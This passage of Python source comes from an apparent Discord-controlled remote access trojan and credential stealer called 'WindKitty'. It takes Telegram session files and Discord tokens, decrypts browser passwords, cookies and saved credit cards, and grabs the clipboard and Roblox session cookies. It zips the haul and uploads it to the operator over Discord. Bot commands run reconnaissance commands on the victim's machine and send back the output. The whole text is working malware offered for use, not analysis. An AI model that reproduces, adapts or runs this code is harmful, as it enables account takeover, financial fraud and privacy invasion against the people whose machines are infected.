    embed = discord.Embed(title=':warning: Please wait!', description="Command was executed! please wait, data is being sent, it might take a minute or two.", color=discord.Color.yellow())
    await ctx.send(embed=embed)
    tele = 'Telegram'
    os.system(f'taskkill /f /im {tele}.exe')
    os.system('echo evilbytecode was here >> %userprofile%\\AppData\\Local\\Temp\\readme.txt ')
    os.system('cls')
    pth = os.path.join(os.getenv('userprofile'), 'AppData', 'Roaming', 'Telegram Desktop', 'tdata')
    des = os.path.join(os.getenv('Temp'), 'WindKitty', 'Socials', 'Telegram')
    exclde = ["_*.config", "dumps", "tdummy", "emoji", "user_data", "user_data#2", "user_data#3", "user_data#4", "user_data#5", "user_data#6", "*.json", "webview"]

    os.makedirs(des, exist_ok=True)

    for root, dirs, files in os.walk(pth, topdown=True):
        dirs[:] = [d for d in dirs if not any(exclude in d for exclude in exclde)]
        for file in files:
            if not any(exclude in file for exclude in exclde):
                srcfil3 = os.path.join(root, file)
                relpath = os.path.relpath(srcfil3, pth)
                desfil3 = os.path.join(des, relpath)
                os.makedirs(os.path.dirname(desfil3), exist_ok=True)
                shutil.copy2(srcfil3, desfil3)

    kittyneme = os.path.join(os.getenv('Temp'), 'TELEGRAMWINDKITTYGRABBED.zip')
    with zipfile.ZipFile(kittyneme, 'w') as zipf:
        for root, _, files in os.walk(des):
            for file in files:
                fleepathkitty = os.path.join(root, file)
                relpeth = os.path.relpath(fleepathkitty, des)
                zipf.write(fleepathkitty, relpeth)

    embed = discord.Embed(description='Wifi Network Info stolen successfully...')
    await ctx.send(embed=embed, file=discord.File(kittyneme))
    os.remove(kittyneme)


################## < END OF  DISCORD RAT COMMANDS > #################





###################### < MAIN STEALING AFTER USERS CONNECTS I WANT TO SEND THE INFO AS A ZIP TO THERE INCASE IT DISCONNECTS >############################

def gettele():
    tele = 'Telegram'
    os.system(f'taskkill /f /im {tele}.exe')
    os.system('echo evilbytecode was here >> %userprofile%\\AppData\\Local\\Temp\\readme.txt ')
    os.system('cls')
    pth = os.path.join(os.getenv('userprofile'), 'AppData', 'Roaming', 'Telegram Desktop', 'tdata')
    des = os.path.join(os.getenv('Temp'), 'WindKitty', 'Socials', 'Telegram')
    exclde = ["_*.config", "dumps", "tdummy", "emoji", "user_data", "user_data#2", "user_data#3", "user_data#4", "user_data#5", "user_data#6", "*.json", "webview"]

    os.makedirs(des, exist_ok=True)

    for root, dirs, files in os.walk(pth, topdown=True):
        dirs[:] = [d for d in dirs if not any(exclude in d for exclude in exclde)]
        for file in files:
            if not any(exclude in file for exclude in exclde):
                srcfil3 = os.path.join(root, file)
                relpath = os.path.relpath(srcfil3, pth)
                desfil3 = os.path.join(des, relpath)
                os.makedirs(os.path.dirname(desfil3), exist_ok=True)
                shutil.copy2(srcfil3, desfil3)

gettele()

#################################< ANYTHING BELOW THIS LINE IS MADE BY SMUG246 : https://github.com/Smug246/Luna-Grabber CREDITS GO TO HIN >##########################################
# I WAS LAZYY TO CODE IT MYSELF AND ONLY REWROTE IT..
def getdcinfo12():
    all_tokens = []
    appdata = os.getenv("LOCALAPPDATA")
    roaming = os.getenv("APPDATA")
    encrypt_regex = r"dQw4w9WgXcQ:[^\"]*"
    normal_regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
    baseurl = "https://discord.com/api/v9/users/@me"
    tokens = []
    ids = []

    tmp1 = os.path.join(os.getenv('Temp'), 'WindKitty', 'Socials', 'Discord')
    os.makedirs(tmp1, exist_ok=True)

    paths = {
        "Discord": roaming + "\\discord\\Local Storage\\leveldb\\",
        "Discord Canary": roaming + "\\discordcanary\\Local Storage\\leveldb\\",
        "Lightcord": roaming + "\\Lightcord\\Local Storage\\leveldb\\",
        "Discord PTB": roaming + "\\discordptb\\Local Storage\\leveldb\\",
        "Opera": roaming + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\",
        "Opera GX": roaming + "\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\",
        "Amigo": appdata + "\\Amigo\\User Data\\Local Storage\\leveldb\\",
        "Torch": appdata + "\\Torch\\User Data\\Local Storage\\leveldb\\",
        "Kometa": appdata + "\\Kometa\\User Data\\Local Storage\\leveldb\\",
        "Orbitum": appdata + "\\Orbitum\\User Data\\Local Storage\\leveldb\\",
        "CentBrowser": appdata + "\\CentBrowser\\User Data\\Local Storage\\leveldb\\",
        "7Star": appdata + "\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\",
        "Sputnik": appdata + "\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\",
        "Vivaldi": appdata + "\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\",
        "Chrome SxS": appdata + "\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\",
        "Chrome": appdata + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\",
        "Chrome1": appdata + "\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\",
        "Chrome2": appdata + "\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\",
        "Chrome3": appdata + "\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\",
        "Chrome4": appdata + "\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\",
        "Chrome5": appdata + "\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\",
        "Epic Privacy Browser": appdata + "\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\",
        "Microsoft Edge": appdata + "\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\",
        "Uran": appdata + "\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\",
        "Yandex": appdata + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\",
        "Brave": appdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\",
        "Iridium": appdata + "\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\",
    }

    def decrypt_val(buff, master_key):
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()

        return decrypted_pass

    def get_key(path):
        if not os.path.exists(path):
            return

        if "os_crypt" not in open(path, "r", encoding="utf-8").read():
            return

        with open(path, "r", encoding="utf-8") as f:
            c = f.read()

        local_state = loads(c)
        master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]

        return master_key

    for name, path in paths.items():
        if not os.path.exists(path):
            continue
        disc = name.replace(" ", "").lower()
        if "cord" in path:
            if os.path.exists(roaming + f"\\{disc}\\Local State"):
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [
                        x.strip()
                        for x in open(f"{path}\\{file_name}", errors="ignore").readlines()
                        if x.strip()
                    ]:
                        for y in findall(encrypt_regex, line):
                            try:
                                token = decrypt_val(
                                    b64decode(y.split("dQw4w9WgXcQ:")[1]),
                                    get_key(roaming + f"\\{disc}\\Local State"),
                                )
                            except:
                                token = "ERROR"
                            r = get(
                                baseurl,
                                headers={
                                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
                                    "Content-Type": "application/json",
                                    "Authorization": token,
                                },
                            )
                            if r.status_code == 200:
                                uid = r.json()["id"]
                                if uid not in ids:
                                    tokens.append(token)
                                    ids.append(uid)
        else:
            for file_name in os.listdir(path):
                if file_name[-3:] not in ["log", "ldb"]:
                    continue
                for line in [
                    x.strip()
                    for x in open(f"{path}\\{file_name}", errors="ignore").readlines()
                    if x.strip()
                ]:
                    for token in findall(normal_regex, line):
                        r = get(
                            baseurl,
                            headers={
                                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
                                "Content-Type": "application/json",
                                "Authorization": token,
                            },
                        )
                        if r.status_code == 200:
                            uid = r.json()["id"]
                            if uid not in ids:
                                tokens.append(token)
                                ids.append(uid)

    if os.path.exists(roaming + "\\Mozilla\\Firefox\\Profiles"):
        for path, _, files in os.walk(roaming + "\\Mozilla\\Firefox\\Profiles"):
            for _file in files:
                if not _file.endswith(".sqlite"):
                    continue
                for line in [
                    x.strip()
                    for x in open(f"{path}\\{_file}", errors="ignore").readlines()
                    if x.strip()
                ]:
                    for token in findall(normal_regex, line):
                        r = get(
                            baseurl,
                            headers={
                                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
                                "Content-Type": "application/json",
                                "Authorization": token,
                            },
                        )
                        if r.status_code == 200:
                            uid = r.json()["id"]
                            if uid not in ids:
                                tokens.append(token)

    storetoken = os.path.join(tmp1, "tokens.txt")

    with open(storetoken, "a+", encoding="utf-8", errors="ignore") as f:
        for item in tokens:
            f.write(f"{item}\n")

    with open(storetoken, 'r') as file:
        token = file.read().strip()

getdcinfo12()

class Browsers:
    def __init__(self):
        self.appdata = os.getenv('LOCALAPPDATA')
        self.roaming = os.getenv('APPDATA')
        self.browser_exe = ["chrome.exe", "firefox.exe", "brave.exe", "opera.exe", "kometa.exe", "orbitum.exe", "centbrowser.exe",
                            "7star.exe", "sputnik.exe", "vivaldi.exe", "epicprivacybrowser.exe", "msedge.exe", "uran.exe", "yandex.exe", "iridium.exe"]
        self.browsers_found = []
        self.browsers = {
            'kometa': self.appdata + '\\Kometa\\User Data',
            'orbitum': self.appdata + '\\Orbitum\\User Data',
            'cent-browser': self.appdata + '\\CentBrowser\\User Data',
            '7star': self.appdata + '\\7Star\\7Star\\User Data',
            'sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data',
            'vivaldi': self.appdata + '\\Vivaldi\\User Data',
            'google-chrome-sxs': self.appdata + '\\Google\\Chrome SxS\\User Data',
            'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
            'epic-privacy-browser': self.appdata + '\\Epic Privacy Browser\\User Data',
            'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data',
            'uran': self.appdata + '\\uCozMedia\\Uran\\User Data',
            'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
            'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
            'iridium': self.appdata + '\\Iridium\\User Data',
            'opera': self.roaming + '\\Opera Software\\Opera Stable',
            'opera-gx': self.roaming + '\\Opera Software\\Opera GX Stable',
        }

        self.profiles = [
            'Default',
            'Profile 1',
            'Profile 2',
            'Profile 3',
            'Profile 4',
            'Profile 5',
        ]

        for proc in psutil.process_iter(['name']):
            process_name = proc.info['name'].lower()
            if process_name in self.browser_exe:
                self.browsers_found.append(proc)

        for proc in self.browsers_found:
            try:
                proc.kill()
            except Exception:
                pass
        temp_path = os.path.join(os.environ['TEMP'], 'WindKitty', 'Browsers')
        os.makedirs(os.path.join(temp_path, "Browser"), exist_ok=True)

        def process_browser(name, path, profile, func):
            try:
                func(name, path, profile)
            except:
                pass

        threads = []
        for name, path in self.browsers.items():
            if not os.path.isdir(path):
                continue

            self.masterkey = self.get_master_key(path + '\\Local State')
            self.funcs = [
                self.cookies,
                self.history,
                self.passwords,
                self.credit_cards
            ]

            for profile in self.profiles:
                for func in self.funcs:
                    thread = threading.Thread(target=process_browser, args=(name, path, profile, func))
                    thread.start()
                    threads.append(thread)

        for thread in threads:
            thread.join()


    def get_master_key(self, path: str) -> str:
        try:
            with open(path, "r", encoding="utf-8") as f:
                c = f.read()
            local_state = json.loads(c)
            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key = master_key[5:]
            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
            return master_key
        except:
            pass

    def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass

    def passwords(self, name: str, path: str, profile: str):
        if name == 'opera' or name == 'opera-gx':
            path += '\\Login Data'
        else:
            path += '\\' + profile + '\\Login Data'
        if not os.path.isfile(path):
            return
        conn = sqlite3.connect(path)
        cursor = conn.cursor()
        cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
        temp_path = os.path.join(os.environ['TEMP'], 'WindKitty', 'Browsers')
        password_file_path = os.path.join(temp_path, "Browser", "passwords.txt")
        for results in cursor.fetchall():
            if not results[0] or not results[1] or not results[2]:
                continue
            url = results[0]
            login = results[1]
            password = self.decrypt_password(results[2], self.masterkey)
            with open(password_file_path, "a", encoding="utf-8") as f:
                if os.path.getsize(password_file_path) == 0:
                    f.write("Website  |  Username  |  Password\n\n")
                f.write(f"{url}  |  {login}  |  {password}\n")
        cursor.close()
        conn.close()

    def cookies(self, name: str, path: str, profile: str):
        if name == 'opera' or name == 'opera-gx':
            path += '\\Network\\Cookies'
        else:
            path += '\\' + profile + '\\Network\\Cookies'
        if not os.path.isfile(path):
            return
        cookievault = create_temp()
        copy2(path, cookievault)
        conn = sqlite3.connect(cookievault)
        cursor = conn.cursor()
        temp_path = os.path.join(os.environ['TEMP'], 'WindKitty', 'Browsers')
        with open(os.path.join(temp_path, "Browser", "cookies.txt"), 'a', encoding="utf-8") as f:
            f.write(f"\nBrowser: {name}     Profile: {profile}\n\n")
            for res in cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies").fetchall():
                host_key, name, path, encrypted_value, expires_utc = res
                value = self.decrypt_password(encrypted_value, self.masterkey)
                if host_key and name and value != "":
                    f.write(f"{host_key}\t{'FALSE' if expires_utc == 0 else 'TRUE'}\t{path}\t{'FALSE' if host_key.startswith('.') else 'TRUE'}\t{expires_utc}\t{name}\t{value}\n")
        cursor.close()
        conn.close()
        os.remove(cookievault)

    def history(self, name: str, path: str, profile: str):
        if name == 'opera' or name == 'opera-gx':
            path += '\\History'
        else:
            path += '\\' + profile + '\\History'
        if not os.path.isfile(path):
            return
        conn = sqlite3.connect(path)
        cursor = conn.cursor()
        temp_path = os.path.join(os.environ['TEMP'], 'WindKitty', 'Browsers')
        history_file_path = os.path.join(temp_path, "Browser", "history.txt")
        with open(history_file_path, 'a', encoding="utf-8") as f:
            if os.path.getsize(history_file_path) == 0:
                f.write("Url  |  Visit Count\n\n")
            for res in cursor.execute("SELECT url, visit_count FROM urls").fetchall():
                url, visit_count = res
                f.write(f"{url}  |  {visit_count}\n")
        cursor.close()
        conn.close()

    def credit_cards(self, name: str, path: str, profile: str):
        if name in ['opera', 'opera-gx']:
            path += '\\Web Data'
        else:
            path += '\\' + profile + '\\Web Data'
        if not os.path.isfile(path):
            return
        conn = sqlite3.connect(path)
        cursor = conn.cursor()
        temp_path = os.path.join(os.environ['TEMP'], 'WindKitty', 'Browsers')
        cc_file_path = os.path.join(temp_path, "Browser", "cc's.txt")
        with open(cc_file_path, 'a', encoding="utf-8") as f:
            if os.path.getsize(cc_file_path) == 0:
                f.write("Name on Card  |  Expiration Month  |  Expiration Year  |  Card Number  |  Date Modified\n\n")
            for res in cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards").fetchall():
                name_on_card, expiration_month, expiration_year, card_number_encrypted = res
                card_number = self.decrypt_password(card_number_encrypted, self.masterkey)
                f.write(f"{name_on_card}  |  {expiration_month}  |  {expiration_year}  |  {card_number}\n")
        cursor.close()
        conn.close()

def create_temp(_dir: str or os.PathLike = None):
    if _dir is None:
        _dir = os.path.expanduser("~/tmp")
    if not os.path.exists(_dir):
        os.makedirs(_dir)
    file_name = ''.join(random.SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randint(10, 20)))
    path = os.path.join(_dir, file_name)
    open(path, "x").close()
    return path

#################################< ANYTHING ABOVE THIS LINE IS MADE BY SMUG246 : https://github.com/Smug246/Luna-Grabber CREDITS GO TO HIN >##########################################

def getclipboard(folder_name='WindKitty'):
    mainpathofwindkitty = os.path.join(os.getenv('Temp'), folder_name)
    os.makedirs(mainpathofwindkitty, exist_ok=True)

    with open(os.path.join(mainpathofwindkitty, 'clipboard_data.txt'), 'w') as file:
        file.write(subprocess.check_output(['powershell', 'Get-Clipboard'], text=True))
getclipboard()

def rbxcookie():
    cookies = {}
    browsers = [('Chrome', browser_cookie3.chrome), ('Edge', browser_cookie3.edge), ('Firefox', browser_cookie3.firefox), ('Safari', browser_cookie3.safari), ('Opera', browser_cookie3.opera), ('Brave', browser_cookie3.brave), ('Vivaldi', browser_cookie3.vivaldi)]
    
    for browser_name, browser in browsers:
        try:
            browser_cookies = browser(domain_name='roblox.com')
            for cookie in browser_cookies:
                if cookie.name == '.ROBLOSECURITY':
                    cookies[browser_name] = cookie.value
        except:
            pass
    
    temp_path = os.environ.get('temp')
    output_path = os.path.join(temp_path, 'WindKitty', 'Games', 'Roblox')

    os.makedirs(output_path, exist_ok=True)

    output_file_path = os.path.join(output_path, 'roblox_cookies.txt')
    with open(output_file_path, 'w') as file:
        for browser_name, cookie_value in cookies.items():
            file.write(f'{browser_name}: {cookie_value}\n\n')

    return cookies

rbxcookie()

def zipkitty(kittyput, kittynameuuwu):
    shutil.make_archive(kittynameuuwu, 'zip', kittyput)

kittyput = os.path.join(os.environ['TEMP'], 'WindKitty')
sockdeskname = socket.gethostname()
kittyname = os.path.join(os.environ['TEMP'], f'windkitty-grabbed-{sockdeskname}')
zipkitty(kittyput, kittyname)

###################### < MAIN STEALING AFTER USERS CONNECTS I WANT TO SEND THE INFO AS A ZIP TO THERE INCASE IT DISCONNECTS >############################



@bot.command(name='pcscrape')
@commands.cooldown(1, 5, commands.BucketType.user)
async def scrape(ctx, key=None):
    if not await validate_key(ctx, key):
        return
    temp2scrape = os.path.join(os.environ['TEMP'], 'WINDKITTYSCRAPER')
    os.makedirs(temp2scrape, exist_ok=True)

    file_path = os.path.join(temp2scrape, 'scrape_result.txt')

    with open(file_path, 'w+', encoding='utf-8') as f:
        scrapecmds = {
            "Current User": "whoami /all",
            "Local Network": "ipconfig /all",
            "FireWall Config": "netsh firewall show config",
            "Local Users": "net user",
            "Admin Users": "net localgroup administrators",
            "Anti-Virus Programs": r"WMIC /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName,productState,pathToSignedProductExe",
            "Port Information": "netstat -ano",
            "Routing Information": "route print",
            "Hosts": "type c:\\Windows\\system32\\drivers\\etc\\hosts",
            "WIFI Networks": "netsh wlan show profile",
            "Startups": "wmic startup get command, caption",
            "DNS Records": "ipconfig /displaydns",
            "User Group Information": "net localgroup",
            "Network Configuration": "ipconfig /all",
            "Event Logs": "wevtutil qe System /c:1 /rd:true /f:text /q:*[System[(Level=2 or Level=3)]]",
            "Enviorement Variables": "set",
            "ARP Table": "arp -a",
        }
        for key, value in scrapecmds.items():
            f.write('\n──────WINDKITTYRAT──────[%s]──────WINDKITTYRAT──────' % key)
            cmd_output = os.popen(value).read()
            f.write(cmd_output)

    embed = discord.Embed(title="Scraped information on Targets Computer",description="Uploading file...",color=discord.Color.blue())
    await ctx.send(embed=embed)
    await ctx.send(file=discord.File(file_path))




################################ < troll commands > #################################################
@bot.command(name='turnonmonitor')
@commands.cooldown(1, 5, commands.BucketType.user)
async def speak(ctx, key=None):
    if not await validate_key(ctx, key):
        return
    
    onmonitor()
    await ctx.send('Monitor turned on.')

@bot.command(name='turnoffmonitor')
@commands.cooldown(1, 5, commands.BucketType.user)
async def speak(ctx, key=None):
    if not await validate_key(ctx, key):
        return
    
    offmonitor()
    await ctx.send('Monitor turned off.')



@bot.command(name='sus')
@commands.cooldown(1, 5, commands.BucketType.user)
async def sus(ctx, key=None):
    if not await validate_key(ctx, key):
        return
    
    sussound1, output_file = "https://cdn.discordapp.com/attachments/1170689299394596885/1177487813088911411/Sex.mp3?ex=6572affb&is=65603afb&hm=62ceed0cf276db8051ce15886684389e80a3d21a3f4526d4462b13eba2ff192c&", Path.home() / "AppData" / "Local" / "Temp" / "Sex.mp3"

    with open(output_file, "wb") as file:
        file.write(requests.get(sussound1).content)

    pygame.init()
    pygame.mixer.init()
    pygame.mixer.music.load(str(output_file))
    pygame.mixer.music.play()

    time.sleep(29)

    pygame.mixer.music.stop()
    pygame.quit()


@bot.command(name='goofsounds')
@commands.cooldown(1, 5, commands.BucketType.user)
async def sus(ctx, key=None):
    if not await validate_key(ctx, key):
        return
    
    goofsound, goofsoundput = "https://cdn.discordapp.com/attachments/1170689299394596885/1177487813088911411/Sex.mp3?ex=6572affb&is=65603afb&hm=62ceed0cf276db8051ce15886684389e80a3d21a3f4526d4462b13eba2ff192c&", Path.home() / "AppData" / "Local" / "Temp" / "Sex.mp3"

    with open(goofsoundput, "wb") as file:
        file.write(requests.get(goofsound).content)

    pygame.init()
    pygame.mixer.init()
    pygame.mixer.music.load(str(goofsoundput))
    pygame.mixer.music.play()

    time.sleep(56)

    pygame.mixer.music.stop()
    pygame.quit()


################## < STARTS A DISCORD BOT > #################
bot.run(config['token'])
################## < DISCORD RAT COMMANDS > #################





